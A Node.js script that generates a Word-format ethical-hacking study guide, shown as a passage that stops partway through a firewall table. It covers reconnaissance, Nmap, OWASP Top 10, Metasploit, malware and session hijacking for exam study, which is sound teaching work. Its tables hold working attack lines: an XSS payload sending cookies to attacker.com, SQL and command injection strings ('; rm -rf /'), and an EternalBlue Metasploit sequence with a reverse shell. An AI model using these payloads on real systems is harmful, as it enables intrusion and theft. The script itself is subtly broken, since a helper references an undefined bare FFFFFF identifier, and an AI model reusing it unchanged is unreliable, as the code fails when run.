const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  HeadingLevel, AlignmentType, BorderStyle, WidthType, ShadingType,
  LevelFormat, PageBreak, UnderlineType
} = require('docx');
const fs = require('fs');

// ── Helpers ──────────────────────────────────────────────────────────────────

const bdr = { style: BorderStyle.SINGLE, size: 1, color: "CCCCCC" };
const borders = { top: bdr, bottom: bdr, left: bdr, right: bdr };
const noBorders = {
  top:    { style: BorderStyle.NONE, size: 0, color: "FFFFFF" },
  bottom: { style: BorderStyle.NONE, size: 0, color: "FFFFFF" },
  left:   { style: BorderStyle.NONE, size: 0, color: "FFFFFF" },
  right:  { style: BorderStyle.NONE, size: 0, color: "FFFFFF" },
};

const ACCENT   = "1F497D";
const BLUE     = "2E75B6";
const LBLUE    = "D0E4F7";
const DGRAY    = "444444";
const MGRAY    = "666666";
const LGRAY    = "F5F5F5";
const ALTROW   = "EBF3FB";
const WHITE    = "FFFFFF";
const GOLD     = "C09030";
const RED      = "C0392B";
const GREEN    = "1A7A4A";

function sp(n = 1) {
  return Array.from({ length: n }, () =>
    new Paragraph({ children: [new TextRun({ text: "", size: 18 })] })
  );
}

function pageBreak() {
  return new Paragraph({ children: [new PageBreak()] });
}

function title(text) {
  return new Paragraph({
    alignment: AlignmentType.CENTER,
    spacing: { before: 0, after: 160 },
    children: [new TextRun({ text, bold: true, size: 44, color: ACCENT, font: "Arial" })]
  });
}

function subtitle(text) {
  return new Paragraph({
    alignment: AlignmentType.CENTER,
    spacing: { before: 0, after: 400 },
    children: [new TextRun({ text, size: 22, color: MGRAY, font: "Arial", italics: true })]
  });
}

function unitBanner(text) {
  // Full-width colored banner for unit headings
  return new Table({
    width: { size: 9360, type: WidthType.DXA },
    columnWidths: [9360],
    rows: [new TableRow({ children: [
      new TableCell({
        borders: noBorders,
        width: { size: 9360, type: WidthType.DXA },
        shading: { fill: ACCENT, type: ShadingType.CLEAR },
        margins: { top: 120, bottom: 120, left: 200, right: 200 },
        children: [new Paragraph({
          children: [new TextRun({ text, bold: true, size: 32, color: WHITE, font: "Arial" })]
        })]
      })
    ]})]
  });
}

function h2(text) {
  return new Paragraph({
    spacing: { before: 240, after: 80 },
    children: [new TextRun({ text, bold: true, size: 26, color: BLUE, font: "Arial",
      underline: { type: UnderlineType.SINGLE, color: BLUE } })]
  });
}

function h3(text) {
  return new Paragraph({
    spacing: { before: 160, after: 60 },
    children: [new TextRun({ text, bold: true, size: 22, color: DGRAY, font: "Arial" })]
  });
}

function bullet(text, sub = false) {
  return new Paragraph({
    numbering: { reference: sub ? "sub-bullets" : "bullets", level: 0 },
    spacing: { before: 40, after: 40 },
    children: typeof text === "string"
      ? [new TextRun({ text, size: 20, font: "Arial" })]
      : text
  });
}

function bulletBold(label, rest) {
  return bullet([
    new TextRun({ text: label + " ", bold: true, size: 20, font: "Arial", color: ACCENT }),
    new TextRun({ text: rest, size: 20, font: "Arial" })
  ]);
}

function body(text) {
  return new Paragraph({
    spacing: { before: 60, after: 60 },
    children: [new TextRun({ text, size: 20, font: "Arial" })]
  });
}

function note(text) {
  return new Table({
    width: { size: 9360, type: WidthType.DXA },
    columnWidths: [9360],
    rows: [new TableRow({ children: [new TableCell({
      borders: {
        top:    { style: BorderStyle.SINGLE, size: 3, color: GOLD },
        bottom: { style: BorderStyle.SINGLE, size: 3, color: GOLD },
        left:   { style: BorderStyle.THICK,  size: 12, color: GOLD },
        right:  { style: BorderStyle.NONE, size: 0, color: FFFFFF },
      },
      width: { size: 9360, type: WidthType.DXA },
      shading: { fill: "FFFDE7", type: ShadingType.CLEAR },
      margins: { top: 80, bottom: 80, left: 160, right: 120 },
      children: [new Paragraph({ children: [
        new TextRun({ text: "⚑ Exam Tip: ", bold: true, size: 20, color: GOLD, font: "Arial" }),
        new TextRun({ text, size: 20, font: "Arial", color: DGRAY })
      ]})]
    })]})],
  });
}

function codeBlock(lines) {
  const rows = lines.map(line => new TableRow({ children: [new TableCell({
    borders: noBorders,
    width: { size: 9100, type: WidthType.DXA },
    margins: { top: 40, bottom: 40, left: 160, right: 160 },
    children: [new Paragraph({ children: [new TextRun({ text: line, size: 18, font: "Courier New", color: "00CC66" })] })]
  })]}));
  return new Table({
    width: { size: 9360, type: WidthType.DXA },
    columnWidths: [9360],
    rows: [new TableRow({ children: [new TableCell({
      borders: { top: bdr, bottom: bdr, left: { style: BorderStyle.THICK, size: 12, color: "00CC66" }, right: bdr },
      width: { size: 9360, type: WidthType.DXA },
      shading: { fill: "1E1E2E", type: ShadingType.CLEAR },
      margins: { top: 100, bottom: 100, left: 0, right: 0 },
      children: [new Table({
        width: { size: 9100, type: WidthType.DXA },
        columnWidths: [9100],
        rows
      })]
    })]})],
  });
}

function makeTable(headers, rows, colWidths, headerColor = BLUE) {
  const totalWidth = colWidths.reduce((a, b) => a + b, 0);
  return new Table({
    width: { size: totalWidth, type: WidthType.DXA },
    columnWidths: colWidths,
    rows: [
      new TableRow({
        tableHeader: true,
        children: headers.map((h, i) => new TableCell({
          borders,
          width: { size: colWidths[i], type: WidthType.DXA },
          shading: { fill: headerColor, type: ShadingType.CLEAR },
          margins: { top: 80, bottom: 80, left: 120, right: 120 },
          children: [new Paragraph({ children: [new TextRun({ text: h, bold: true, size: 19, color: WHITE, font: "Arial" })] })]
        }))
      }),
      ...rows.map((row, ri) => new TableRow({
        children: row.map((cell, i) => new TableCell({
          borders,
          width: { size: colWidths[i], type: WidthType.DXA },
          shading: { fill: ri % 2 === 0 ? WHITE : ALTROW, type: ShadingType.CLEAR },
          margins: { top: 70, bottom: 70, left: 120, right: 120 },
          children: [new Paragraph({ children: [new TextRun({ text: cell, size: 18, font: "Arial" })] })]
        }))
      }))
    ]
  });
}

// ── Content ───────────────────────────────────────────────────────────────────

const doc = new Document({
  numbering: {
    config: [
      {
        reference: "bullets",
        levels: [{ level: 0, format: LevelFormat.BULLET, text: "▸", alignment: AlignmentType.LEFT,
          style: { paragraph: { indent: { left: 560, hanging: 280 } },
                   run: { color: BLUE, size: 20 } } }]
      },
      {
        reference: "sub-bullets",
        levels: [{ level: 0, format: LevelFormat.BULLET, text: "–", alignment: AlignmentType.LEFT,
          style: { paragraph: { indent: { left: 1000, hanging: 280 } },
                   run: { color: MGRAY, size: 18 } } }]
      },
      {
        reference: "numbered",
        levels: [{ level: 0, format: LevelFormat.DECIMAL, text: "%1.", alignment: AlignmentType.LEFT,
          style: { paragraph: { indent: { left: 560, hanging: 280 } } } }]
      }
    ]
  },
  styles: {
    default: { document: { run: { font: "Arial", size: 20 } } },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 32, bold: true, font: "Arial", color: ACCENT },
        paragraph: { spacing: { before: 300, after: 120 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 26, bold: true, font: "Arial", color: BLUE },
        paragraph: { spacing: { before: 200, after: 80 }, outlineLevel: 1 } },
    ]
  },
  sections: [{
    properties: {
      page: {
        size: { width: 12240, height: 15840 },
        margin: { top: 1080, right: 1008, bottom: 1080, left: 1008 }
      }
    },
    children: [

// ══════════════════════════════════════════════════════════════════════════════
// COVER / TITLE
// ══════════════════════════════════════════════════════════════════════════════
      ...sp(2),
      title("ETHICAL HACKING &"),
      title("PENETRATION TESTING"),
      subtitle("Complete Condensed Study Guide  ·  All 5 Units  ·  AY 2025–2026"),

      makeTable(
        ["Unit", "Topic", "Key Tools"],
        [
          ["Unit 1", "Introduction, Recon, Enumeration, Nmap", "Nmap, Netcat, SNMPwalk"],
          ["Unit 2", "Scanning, VA Life-Cycle, Web Security, OWASP", "Nessus, Burp Suite, Metasploit"],
          ["Unit 3", "Malware, Social Engineering, Session Hijacking", "Wireshark, Cuckoo, SET"],
          ["Unit 4", "Firewalls, IDS/IPS, Evasion, Honeypots", "Snort, Suricata, Scapy, Hping3"],
          ["Unit 5", "Bug Bounty, Post-Exploitation, Advanced OSINT", "Shodan, Mimikatz, LinPEAS"],
        ],
        [1100, 4600, 3660]
      ),
      ...sp(2),

      pageBreak(),

// ══════════════════════════════════════════════════════════════════════════════
// UNIT 1
// ══════════════════════════════════════════════════════════════════════════════
      unitBanner("UNIT 1 — Introduction to Ethical Hacking"),
      ...sp(1),

      h2("1.1  What is Ethical Hacking?"),
      body("Ethical hacking is the authorized practice of deliberately probing systems, networks, and applications to identify security vulnerabilities before malicious attackers do. It is always performed with explicit written permission from the target organization."),
      ...sp(1),
      bulletBold("Legality:", "Always obtain written permission (Rules of Engagement document) before any test."),
      bulletBold("Defined Scope:", "Stay strictly within agreed boundaries; never test out-of-scope systems."),
      bulletBold("Non-destructive:", "Do not damage, modify, or delete data during testing."),
      bulletBold("Confidentiality:", "All findings are private and shared only with authorized personnel."),
      bulletBold("Reporting:", "Document every vulnerability honestly, including severity and remediation steps."),
      bulletBold("Integrity:", "Act in the best interest of the organization, not personal or financial gain."),
      ...sp(1),

      h2("1.2  The Five Phases of Hacking"),
      makeTable(
        ["Phase", "Description", "Tools / Methods"],
        [
          ["1. Reconnaissance", "Passive info gathering — no direct contact with target. Collect DNS records, WHOIS data, employee names, tech stack.", "WHOIS, Shodan, Maltego, Google Dorking, LinkedIn OSINT"],
          ["2. Scanning", "Active probing — discover live hosts, open ports, running services, OS version, and known vulnerabilities.", "Nmap, Nessus, OpenVAS, Masscan, Angry IP Scanner"],
          ["3. Gaining Access", "Exploit discovered vulnerabilities to break into the system — unpatched software, SQL injection, password cracking, or phishing.", "Metasploit, SQLmap, Hydra, SET, Burp Suite"],
          ["4. Maintaining Access", "Ensure persistent access after initial compromise. Install backdoors, rootkits, or Trojans to extract data over time without re-exploitation.", "Meterpreter shells, cron jobs, registry keys, web shells"],
          ["5. Clearing Tracks", "Remove all evidence of the intrusion — delete logs, hide uploaded files, alter timestamps, cover digital footprints.", "Log cleaners, Metasploit timestomp, shell history wipe"],
        ],
        [1800, 4300, 3260]
      ),
      ...sp(1),
      note("In ethical hacking all five phases are performed with permission. Findings are documented and reported rather than exploited for gain."),
      ...sp(1),

      h2("1.3  Active vs. Passive Reconnaissance"),
      makeTable(
        ["Feature", "Passive Reconnaissance", "Active Reconnaissance"],
        [
          ["Direct contact", "None — uses public sources", "Yes — interacts with target"],
          ["Detection risk", "Very low", "Higher — may trigger IDS/logs"],
          ["Methods", "WHOIS, DNS, Shodan, LinkedIn, job postings, Netcraft", "Nmap scans, ping sweeps, traceroute, banner grabbing"],
          ["Speed", "Slower, manual", "Faster, often automated"],
          ["Legality", "Generally legal", "Requires explicit permission"],
          ["Example", "DNS records via DNSdumpster", "nmap -sV target.com"],
        ],
        [2200, 3580, 3580]
      ),
      ...sp(1),

      h2("1.4  Types of Hackers"),
      makeTable(
        ["Type", "Authorization", "Motivation", "Example / Notes"],
        [
          ["White Hat", "Yes — full permission", "Improve security, financial via contracts", "Pen testers, bug bounty hunters"],
          ["Black Hat", "None", "Financial theft, data selling, espionage", "Criminal hackers, ransomware gangs"],
          ["Grey Hat", "No permission, no harm", "Curiosity, reputation", "May disclose privately after finding bugs"],
          ["Script Kiddie", "None", "Thrill, attention, bragging rights", "Uses pre-built tools without understanding"],
          ["Hacktivist", "None", "Political or social protest", "Anonymous, defacement campaigns"],
          ["State-Sponsored", "Government-funded", "National interest, espionage, sabotage", "APT groups (APT28, Lazarus)"],
          ["Insider Threat", "Partial (employee)", "Revenge, financial gain, coercion", "Most damaging — already inside perimeter"],
          ["Cyber Terrorist", "None", "Ideological or political terror", "Targets critical infrastructure"],
        ],
        [1700, 1700, 2600, 3360]
      ),
      ...sp(1),

      h2("1.5  Vulnerability Assessment vs. Penetration Testing"),
      makeTable(
        ["Aspect", "Vulnerability Assessment (VA)", "Penetration Testing (PT)"],
        [
          ["Purpose", "Identify and catalogue vulnerabilities", "Exploit vulnerabilities to show real impact"],
          ["Depth", "Broad — covers many systems", "Narrow — targets specific systems deeply"],
          ["Exploitation", "No — only detection", "Yes — active exploitation performed"],
          ["Output", "CVE list with CVSS severity scores", "Proof-of-Concept + business impact report"],
          ["Tools", "Nessus, OpenVAS, Qualys", "Metasploit, Burp Suite, manual techniques"],
          ["Duration", "Hours to days", "Days to weeks"],
          ["Skill Level", "Moderate", "High"],
          ["Risk", "Low", "Higher — may crash systems"],
          ["Frequency", "Continuous / regular", "Quarterly or annually"],
        ],
        [2200, 3580, 3580]
      ),
      ...sp(1),

      h2("1.6  Footprinting Techniques"),
      h3("Passive Footprinting"),
      makeTable(
        ["Technique", "What It Reveals", "Tool / Method"],
        [
          ["WHOIS Lookup", "Domain owner, registrar, contact info, expiry", "whois target.com"],
          ["DNS Lookup", "A, MX, NS, TXT records", "nslookup, dig target.com"],
          ["Google Dorking", "Exposed files, login pages, subdomains", "site:target.com filetype:pdf"],
          ["Shodan", "Internet-facing devices, banners, open ports", "hostname:target.com on Shodan"],
          ["Social Media OSINT", "Employee names, roles, tech stack", "LinkedIn, Twitter, GitHub"],
          ["Job Postings", "Technologies in use (AWS, LAMP stack)", "Indeed, LinkedIn Jobs"],
          ["Netcraft", "Web server type, hosting history, uptime", "netcraft.com"],
        ],
        [2200, 3600, 3560]
      ),
      ...sp(1),
      h3("Active Footprinting"),
      makeTable(
        ["Technique", "What It Does", "Command Example"],
        [
          ["Ping Sweep", "Identify live hosts on a subnet", "nmap -sn 192.168.1.0/24"],
          ["Traceroute", "Map network path to target", "traceroute target.com"],
          ["Port Scanning", "Discover open ports and services", "nmap -sV target.com"],
          ["Banner Grabbing", "Retrieve service version banners", "nc target.com 80"],
          ["DNS Zone Transfer", "Dump all DNS records (misconfigured servers)", "dig axfr @ns1.target.com target.com"],
          ["Web Spidering", "Crawl for links and hidden directories", "Burp Suite Spider, dirb"],
        ],
        [2200, 3600, 3560]
      ),
      ...sp(1),

      h2("1.7  Nmap — Key Scanning Options"),
      makeTable(
        ["Command", "Description"],
        [
          ["nmap -sS target", "SYN (Stealth) scan — sends SYN, doesn't complete handshake"],
          ["nmap -sT target", "TCP Connect scan — full 3-way handshake, more detectable"],
          ["nmap -sU target", "UDP scan — slower, needed for DNS/SNMP/DHCP"],
          ["nmap -sV target", "Service/version detection on open ports"],
          ["nmap -O target", "OS fingerprinting via TCP/IP stack analysis"],
          ["nmap -A target", "Aggressive: OS + version + scripts + traceroute"],
          ["nmap -p- target", "Scan all 65,535 ports"],
          ["nmap --script vuln target", "Run NSE vulnerability scripts"],
          ["nmap -sn 192.168.1.0/24", "Ping sweep — discover all live hosts"],
          ["nmap -D RND:10 target", "Decoy scan — hides real attacker IP"],
        ],
        [3800, 5560]
      ),
      note("Port states: OPEN (service listening), CLOSED (no service), FILTERED (firewall blocking response)."),
      ...sp(1),

      h2("1.8  Enumeration"),
      body("Enumeration is active extraction of detailed information from a target: usernames, group names, network shares, running services, routing tables, and application banners."),
      ...sp(1),
      bulletBold("NetBIOS Enumeration:", "Reveals computer names, shared resources, domain info. Tool: nbtscan, Enum4linux"),
      bulletBold("SNMP Enumeration:", "Community strings 'public' (read) / 'private' (write). Uses MIB tree. Tool: snmpwalk -v2c -c public <IP>"),
      bulletBold("LDAP Enumeration:", "Extracts users, groups, OUs from Active Directory. Tool: ldapsearch"),
      bulletBold("SMTP Enumeration:", "VRFY to verify usernames, EXPN to expand mailing lists via Telnet on port 25"),
      bulletBold("DNS Enumeration:", "Zone transfer reveals all DNS records. Tool: dig axfr @nameserver domain.com"),
      bulletBold("SMB Enumeration:", "Network shares and users via Enum4linux, smbclient, Nmap NSE scripts"),
      ...sp(1),
      h3("Enumeration Countermeasures"),
      bullet("Disable SNMP v1/v2 — use SNMPv3 (encrypted + authenticated); change default community strings"),
      bullet("Block UDP ports 161/162 (SNMP), 137–139 and 445 (NetBIOS/SMB) from external access"),
      bullet("Disable DNS zone transfers to unauthorized servers"),
      bullet("Disable VRFY and EXPN on mail servers"),
      bullet("Require authentication for LDAP; disable anonymous binding"),
      bullet("Implement account lockout policies; rename default admin accounts"),
      ...sp(1),

      h2("1.9  ISO 27001"),
      body("ISO 27001 is the international standard for Information Security Management Systems (ISMS). It provides a framework of policies, procedures, and controls to systematically manage sensitive information."),
      bulletBold("Coverage:", "114 controls across 14 domains (Annex A) — Access Control, Cryptography, Physical Security, Incident Management, Supplier Relations, Compliance, and more."),
      bulletBold("Risk Management:", "Systematic identification, assessment, and treatment of information security risks."),
      bulletBold("Compliance:", "Helps meet GDPR, IT Act, PCI-DSS, and other legal/regulatory requirements."),
      bulletBold("Competitive Advantage:", "ISO 27001 certified organizations win enterprise clients and government contracts."),
      note("ISO 27001 is process-focused (HOW to manage security), not technical. It certifies an organization's ISMS, not specific products."),
      ...sp(1),

      pageBreak(),

// ══════════════════════════════════════════════════════════════════════════════
// UNIT 2
// ══════════════════════════════════════════════════════════════════════════════
      unitBanner("UNIT 2 — Scanning, Vulnerability Assessment & Web Application Security"),
      ...sp(1),

      h2("2.1  Network Scanning Methodology"),
      body("Scanning creates a map of the target's attack surface — identifying live hosts, open ports, running services, OS versions, and known vulnerabilities."),
      makeTable(
        ["Step", "Action", "Command / Tool"],
        [
          ["1", "Check for live systems (ping sweep)", "nmap -sn 192.168.1.0/24"],
          ["2", "Discover open ports (SYN scan)", "nmap -sS <target>"],
          ["3", "Detect service/version", "nmap -sV <target>"],
          ["4", "OS fingerprinting", "nmap -O <target>"],
          ["5", "Vulnerability scanning", "nessus / openvas on discovered services"],
          ["6", "Map network topology", "traceroute + network diagram"],
        ],
        [600, 3500, 5260]
      ),
      ...sp(1),

      h2("2.2  Vulnerability Assessment Life-Cycle"),
      makeTable(
        ["Stage", "Activity", "Key Detail"],
        [
          ["1. Asset Discovery", "Identify all assets: servers, apps, cloud, IoT", "Include shadow IT"],
          ["2. Vulnerability Scanning", "Automated scanner probes all assets", "Nessus, OpenVAS, Qualys"],
          ["3. Analysis", "Remove false positives; correlate with CVE DB", "Manual validation required"],
          ["4. Risk Assessment", "Assign CVSS severity scores", "Critical 9–10, High 7–8.9, Medium 4–6.9"],
          ["5. Remediation Planning", "Patch, harden config, add controls", "Prioritize by CVSS + business impact"],
          ["6. Remediation", "Apply patches and config changes", "Change management process"],
          ["7. Re-Scanning", "Verify vulnerabilities are resolved", "Scan same scope again"],
          ["8. Reporting", "Document findings and current posture", "Executive summary + technical detail"],
          ["9. Continuous Monitoring", "Schedule regular assessments", "Integrate with SIEM"],
        ],
        [800, 3200, 5360]
      ),
      ...sp(1),

      h2("2.3  OWASP Top 10 — Web Application Vulnerabilities"),
      makeTable(
        ["ID", "Vulnerability", "Attack Example", "Prevention"],
        [
          ["A01", "Broken Access Control", "IDOR: change user_id=123 to 124 in URL to access another user's data", "Enforce access control server-side; deny by default"],
          ["A02", "Cryptographic Failures", "Passwords stored in plain text or MD5; HTTP instead of HTTPS", "Use bcrypt/Argon2; enforce TLS everywhere"],
          ["A03", "Injection", "SQL: ' OR '1'='1 -- bypasses login. Command: ; rm -rf /", "Parameterized queries, input validation, WAF"],
          ["A04", "Insecure Design", "No rate limiting on login page = brute force possible", "Threat modeling during design phase"],
          ["A05", "Security Misconfiguration", "Default admin:admin credentials, open S3 buckets, verbose errors", "Disable defaults; security hardening checklists"],
          ["A06", "Vulnerable Components", "Old Apache Struts (CVE-2017-5638) → Equifax breach (147M records)", "Keep dependencies updated; use SCA tools"],
          ["A07", "Auth Failures", "Weak session tokens, missing MFA, credential stuffing", "MFA, strong session management, account lockout"],
          ["A08", "Integrity Failures", "Insecure deserialization → RCE. Supply chain: SolarWinds backdoor", "Verify integrity of code and dependencies"],
          ["A09", "Logging Failures", "No log of failed logins; no alerts on 1000 failed attempts", "Centralized logging + SIEM alerting"],
          ["A10", "SSRF", "Server fetches http://169.254.169.254 → AWS IAM credentials exposed", "Whitelist allowed URLs; block internal IP ranges"],
        ],
        [500, 1900, 3200, 3760]
      ),
      ...sp(1),

      h2("2.4  Security Tools Overview"),
      makeTable(
        ["Tool", "Type", "Key Capability"],
        [
          ["Nessus", "Vulnerability Scanner", "Commercial; CVE detection; CVSS reports; PCI/HIPAA compliance checks"],
          ["OpenVAS", "Vulnerability Scanner", "Open-source; 70,000+ NVTs; Greenbone Security Assistant web UI"],
          ["Qualys", "Vulnerability Scanner", "Cloud-based; continuous monitoring; enterprise use"],
          ["Burp Suite", "Web App Testing", "Proxy + Scanner + Intruder + Repeater; intercepts HTTP/HTTPS traffic"],
          ["OWASP ZAP", "Web App Testing", "Free; active + passive scanning; good for CI/CD integration"],
          ["Nikto", "Web Scanner", "Detects outdated software and misconfigurations: nikto -h http://target"],
          ["Metasploit", "Exploitation", "World's most used pen test framework; 2000+ exploits; Meterpreter shell"],
          ["SQLmap", "SQL Injection", "Automated SQLi detection and exploitation — sqlmap -u URL --dbs"],
        ],
        [1600, 1900, 5860]
      ),
      ...sp(1),

      h2("2.5  Metasploit Framework"),
      makeTable(
        ["Component", "Description"],
        [
          ["msfconsole", "Interactive command-line interface to control the framework"],
          ["Modules", "Organized as: Exploits, Payloads, Auxiliaries, Post, Encoders, Evasion"],
          ["msfvenom", "Generates standalone payloads (EXE, APK, ELF, PHP, etc.)"],
          ["Meterpreter", "Advanced in-memory payload — file system access, pivoting, keylogging"],
          ["Database", "PostgreSQL stores scan results, sessions, and loot"],
        ],
        [2200, 7160]
      ),
      ...sp(1),
      codeBlock([
        "msf6 > use exploit/windows/smb/ms17_010_eternalblue",
        "msf6 > set RHOSTS 192.168.1.10",
        "msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp",
        "msf6 > set LHOST 192.168.1.5",
        "msf6 > exploit",
      ]),
      ...sp(1),

      h2("2.6  Information Security Laws & Standards"),
      makeTable(
        ["Law / Standard", "Jurisdiction", "Key Provision"],
        [
          ["IT Act 2000 / 2008", "India", "Sec 43: unauthorized access | Sec 66: hacking | Sec 66C: identity theft | Sec 66E: privacy violation"],
          ["CFAA", "USA", "Criminalizes unauthorized access to any computer/network system"],
          ["GDPR", "EU", "Protects personal data; breach notification mandatory within 72 hours"],
          ["Computer Misuse Act", "UK", "Criminalizes unauthorized access and impairing computer operations"],
          ["ISO/IEC 27001", "International", "ISMS framework — 114 controls, risk-based approach"],
          ["PCI-DSS", "International", "12 requirements for credit card data handlers"],
          ["HIPAA", "USA", "Protects health information in healthcare systems"],
          ["NIST CSF", "USA / Global", "5 Functions: Identify → Protect → Detect → Respond → Recover"],
        ],
        [2200, 1500, 5660]
      ),
      ...sp(1),

      pageBreak(),

// ══════════════════════════════════════════════════════════════════════════════
// UNIT 3
// ══════════════════════════════════════════════════════════════════════════════
      unitBanner("UNIT 3 — Malware, Social Engineering & Session Hijacking"),
      ...sp(1),

      h2("3.1  Malware Types — Comparison"),
      makeTable(
        ["Type", "Self-Replicates", "Needs Host", "Human Action", "Primary Goal", "Example"],
        [
          ["Virus", "Yes", "Yes (file/program)", "Required to spread", "Corrupt/damage files", "ILOVEYOU, Melissa"],
          ["Worm", "Yes", "No (standalone)", "Not required", "Spread, consume bandwidth", "WannaCry, Conficker"],
          ["Trojan", "No", "No (disguised app)", "Required to install", "Backdoor / steal data", "Zeus, RATs"],
          ["Ransomware", "No", "No", "Required to open", "Encrypt files, demand ransom", "LockBit, REvil"],
          ["Rootkit", "No", "No", "No", "Hide malware/attacker at OS level", "TDSS, ZeroAccess"],
          ["Keylogger", "No", "No", "No", "Capture keystrokes (passwords)", "Ardamax, hardware loggers"],
          ["Spyware", "No", "No", "No", "Monitor activity, steal data", "FinFisher, DarkComet"],
          ["Fileless Malware", "No", "No (lives in RAM)", "No", "Evade AV — no disk trace", "PowerShell-based attacks"],
          ["Botnet", "Yes (via C2)", "No", "No", "DDoS, spam, cryptomining", "Mirai, Emotet"],
        ],
        [1300, 1100, 1400, 1400, 2400, 1760]
      ),
      ...sp(1),

      h2("3.2  Malware Reverse Engineering"),
      h3("Static Analysis (Without Execution)"),
      bullet("Examine the binary without running it — safe but limited to what's visible in code"),
      bullet("Extract: strings, imported API calls, PE headers, sections, resources, packing indicators"),
      bullet("Tools: PEiD (detect packing), strings, Ghidra (NSA disassembler), IDA Pro, Detect-It-Easy"),
      bullet("Reveals: Hardcoded IPs/domains, file paths, registry keys, C2 addresses, compiler info"),
      ...sp(1),
      h3("Dynamic Analysis (With Execution)"),
      bullet("Run malware in an isolated sandbox — observe actual behavior in real time"),
      bullet("Monitor: File system changes, registry modifications, network connections, process spawning"),
      bullet("Tools: Cuckoo Sandbox (automated), Process Monitor, Wireshark, Regshot (registry diff)"),
      bullet("Reveals: C2 server addresses, dropped files, persistence mechanisms, encrypted payloads"),
      ...sp(1),
      note("Always do static analysis first to understand structure before dynamic analysis. Use an isolated VM with network simulation — never run unknown malware on production systems."),
      ...sp(1),

      h2("3.3  Memory Forensics — Volatility Framework"),
      body("Memory forensics analyzes a RAM dump to detect malware, recover volatile data, and investigate incidents. Malware often hides in memory to avoid disk-based detection."),
      makeTable(
        ["Volatility Command", "Purpose"],
        [
          ["volatility -f mem.raw imageinfo", "Identify OS profile of the memory dump"],
          ["volatility -f mem.raw --profile=WinXP pslist", "List all running processes"],
          ["volatility -f mem.raw --profile=WinXP pstree", "Show processes in parent-child tree"],
          ["volatility -f mem.raw --profile=WinXP netscan", "Show active network connections"],
          ["volatility -f mem.raw --profile=WinXP malfind", "Find injected/hidden code in memory"],
          ["volatility -f mem.raw --profile=WinXP hashdump", "Extract password hashes from memory"],
          ["volatility -f mem.raw --profile=WinXP cmdline", "Show command-line args of each process"],
          ["volatility -f mem.raw --profile=WinXP dumpfiles -D ./out", "Extract files from memory to disk"],
        ],
        [4000, 5360]
      ),
      ...sp(1),

      h2("3.4  Session Hijacking"),
      body("Session hijacking exploits a valid authenticated session token to impersonate a user without knowing their credentials."),
      ...sp(1),
      h3("Attack Techniques"),
      makeTable(
        ["Technique", "How It Works"],
        [
          ["Session Sniffing", "Capture session tokens over unencrypted (HTTP) connections using Wireshark"],
          ["XSS Cookie Theft", "<script>document.location='http://attacker.com?c='+document.cookie</script>"],
          ["Man-in-the-Middle", "Attacker intercepts traffic between client and server to capture session tokens"],
          ["Session Fixation", "Attacker forces a known session ID before user authenticates"],
          ["CSRF", "Tricks authenticated user's browser into making unintended requests using their session"],
          ["Brute Force Session ID", "Guess predictable/weak session IDs through enumeration"],
          ["Packet Injection", "Inject malicious packets into an existing active TCP session"],
        ],
        [2500, 6860]
      ),
      ...sp(1),
      h3("Prevention"),
      makeTable(
        ["Mechanism", "What It Does"],
        [
          ["HTTPS / TLS", "Encrypts all traffic — prevents session sniffing entirely"],
          ["HttpOnly Cookie Flag", "Prevents JavaScript from reading the cookie — blocks XSS theft"],
          ["Secure Cookie Flag", "Cookie only sent over HTTPS — blocks transmission on HTTP"],
          ["SameSite Cookie Attribute", "Prevents cookie transmission on cross-site requests — mitigates CSRF"],
          ["Session Timeout", "Invalidate inactive sessions after a set time period"],
          ["Regenerate Session ID", "Issue a new session ID immediately after successful login"],
          ["CSRF Tokens", "Unique hidden token in forms; validated server-side on each request"],
          ["IP / User-Agent Binding", "Invalidate session if client IP or browser fingerprint changes"],
        ],
        [2700, 6660]
      ),
      ...sp(1),

      h2("3.5  Social Engineering Techniques"),
      makeTable(
        ["Technique", "Description", "Psychological Trigger"],
        [
          ["Phishing", "Mass deceptive emails mimicking legit organizations with malicious links/attachments", "Fear, urgency"],
          ["Spear Phishing", "Highly targeted phishing using researched personal details about the victim", "Trust, familiarity"],
          ["Whaling", "Spear phishing aimed at C-level executives (CEO, CFO)", "Authority, urgency"],
          ["Vishing", "Fraudulent phone calls impersonating IT support or bank representatives", "Authority, trust"],
          ["Smishing", "Phishing via SMS — malicious links sent to mobile numbers", "Urgency, fear"],
          ["Pretexting", "Fabricated believable scenario to extract information (e.g., fake auditor, HR)", "Trust, authority"],
          ["Baiting", "Leaving infected USB drives in car parks or office lobbies", "Curiosity"],
          ["Quid Pro Quo", "Offer a service (fake IT helpdesk) in exchange for login credentials", "Reciprocity"],
          ["Tailgating", "Physically following an authorized person into a restricted area", "Politeness, trust"],
          ["Watering Hole", "Infect websites frequently visited by the target organization's employees", "Trust in known sites"],
        ],
        [1700, 3900, 3760]
      ),
      ...sp(1),

      h2("3.6  Wireshark — Network Traffic Analysis"),
      body("Wireshark is an open-source network protocol analyzer that captures and analyzes traffic in real time. Supports 3000+ protocols with display filters, stream following, and PCAP export."),
      ...sp(1),
      makeTable(
        ["Display Filter", "Purpose"],
        [
          ["http.request.method == \"POST\"", "Capture login attempts and form submissions"],
          ["tcp.flags.syn == 1 && tcp.flags.ack == 0", "Detect SYN port scans"],
          ["dns", "Show only DNS traffic"],
          ["ip.addr == 192.168.1.1", "Filter traffic to/from specific IP"],
          ["tcp.port == 80 || tcp.port == 443", "Show only HTTP/HTTPS traffic"],
          ["frame contains \"password\"", "Search for cleartext password strings in packets"],
        ],
        [4200, 5160]
      ),
      ...sp(1),

      pageBreak(),

// ══════════════════════════════════════════════════════════════════════════════
// UNIT 4
// ══════════════════════════════════════════════════════════════════════════════
      unitBanner("UNIT 4 — Firewalls, IDS/IPS & Evasion Techniques"),
      ...sp(1),

      h2("4.1  Firewall Types"),
      makeTable(
        ["Type", "OSI Layer", "How It Works", "Limitation"],
        [
          ["Packet Filtering", "L3/L4 (Network)", "Filters by IP, port, protocol. Checks each packet in isolation.", "Cannot inspect content; no session awareness"],
          ["Stateful Inspection", "L4 (Transport)", "Tracks connection state table; checks packets in context of session.", "Cannot inspect application-layer content"],
          ["Application Layer (Proxy)", "L7 (Application)", "Terminates and re-establishes connections; understands HTTP/FTP.", "Performance overhead; limited protocol support"],
